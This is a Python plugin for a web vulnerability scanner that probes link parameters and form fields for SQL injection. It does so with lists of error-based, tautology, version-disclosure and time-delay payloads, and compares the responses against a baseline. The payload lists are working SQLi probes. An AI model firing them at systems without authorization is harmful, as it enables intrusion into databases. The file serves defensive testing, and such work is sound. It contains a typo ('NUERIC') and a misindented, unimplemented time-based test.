from .base import BasePlugin
from .utils import send_request, compare_responses, contains_error
import urllib.parse
import time


class Plugin(BasePlugin):

    name = "SQL Injection"
    description= "Detects SQLi vulnerabilities."
    payloads = ["'", "''", "\"", "`",
                    "')", "\")",
                    "'--", "\"--", "`--",
                    "'#", "\"#",
                    "' OR 1=1--", "\" OR \"1\"=\"1",
                    "' OR 'a'='a",
                    "1' ORDER BY 100--",
                    "' AND (SELECT @@version)--",
                    "' AND CAST(version() AS NUERIC)--",
                    "' AND 1=CONVERT(INT, @@version)--",
                    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                    "' UNION SELECT sqlite_version()--"
    ]
    timeloads = ["' Or SLEEP(5)--", "\" Or SLEEP(5)--", "` Or SLEEP(5)--", "') Or SLEEP(5)--", "\") Or SLEEP(5)--", "1' OR SLEEP(5)--",
                 "'; WAITFOR DELAY '0:0:5'--", "\"; WAITFOR DELAY '0:0:5'--", "`; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
                 "'; DBMS_LOCK.SLEEP(5)--", "\"; DBMS_LOCK.SLEEP(5)--", "`; DBMS_LOCK.SLEEP(5)--", "1; DBMS_LOCK.SLEEP(5)--",
                 "'; SELECT pg_sleep(5)--", "\"; SELECT pg_sleep(5)--", "`; SELECT pg_sleep(5)--", "1; SELECT pg_sleep(5)--",
                 "'; SELECT sleep(5)--", "\"; SELECT sleep(5)--", "`; SELECT sleep(5)--", "1; SELECT sleep(5)--",
                 "'; SELECT sleep(5);--", "\"; SELECT sleep(5);--", "`; SELECT sleep(5);--", "1; SELECT sleep(5);--",
                 "'; SELECT sleep(5)#", "\"; SELECT sleep(5)#", "`; SELECT sleep(5)#", "1; SELECT sleep(5)#",
    ]
    def run(self, target, session, baseline, reconnaissance):
        findings = []
        findings.extend(self.test_links(session, baseline, reconnaissance))
        findings.extend(self.test_forms(target, session, baseline, reconnaissance))
        #findings.extend(self.test_time(target, session, baseline, reconnaissance)) # TODO ALLOW FAST/SLOW MODES TO TOGGLE TIME BASED SQLI
        return findings

    def check(self, baseline, resp):
        if not resp:
            return None

        if compare_responses(baseline, resp):
            return {"dbms": None, "evidence": "Response differs from baseline"}

        found, db, error_message = contains_error(resp)
        if found:
            return {"dbms": db, "evidence": error_message}

        return None

    def test_links(self, session, baseline, reconnaissance):
        findings = []
        for link in reconnaissance.get("links", []):
            parsed = urllib.parse.urlparse(link)
            if not parsed.query:
                continue

            params = urllib.parse.parse_qs(parsed.query)
            for key in params:
                for payload in self.payloads:
                    test_params = params.copy()
                    test_params[key] = payload
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

                    resp = send_request(session, test_url)
                    c = self.check(baseline, resp)
                    if c:
                        findings.append({
                            "type": "GET param",
                            "url": test_url,
                            "parameter": key,
                            "payload": payload,
                            "dbms": c["dbms"],
                            "evidence": c["evidence"]
                        })
        return findings
    
    def test_forms(self, target, session, baseline, reconnaissance):
        findings = []
        for form in reconnaissance.get("forms", []):
            action = form.get("action") or target
            method = form.get("method", "GET").upper()
            data = {inp["name"]: "test" for inp in form.get("inputs", []) if inp.get("name")}

            for key in data:
                for payload in self.payloads:
                    test_data = data.copy()
                    test_data[key] = payload
                    if method == "GET":
                        resp = session.get(action, params=test_data)
                    else:
                        resp = session.post(action, data=test_data)
                    
                    c = self.check(baseline, resp)
                    if c:
                        findings.append({
                            "type": f"{method} form",
                            "url": action,
                            "parameter": key,
                            "payload": payload,
                            "dbms": c["dbms"],
                            "evidence": c["evidence"]
                        })
        return findings

        def test_time(self, target, session, baseline, reconnaissance):
            # TODO IMPLEMENT TIME BASED SQLI TESTING
            return